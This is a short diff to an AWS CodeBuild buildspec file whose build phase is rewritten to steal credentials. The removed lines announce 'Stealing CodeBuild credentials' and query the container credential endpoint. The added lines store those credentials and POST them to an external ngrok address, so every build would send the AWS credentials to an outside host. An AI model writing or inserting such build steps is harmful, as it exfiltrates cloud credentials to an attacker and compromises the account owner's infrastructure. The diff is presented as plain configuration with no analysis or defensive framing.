@@ -3,5 +3,6 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Stealing CodeBuild credentials"
-      - curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+      - echo "leaking creds"
+      - CREDS=$(curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
+      - curl -X POST -d "$CREDS" http://2.tcp.ngrok.io:21364
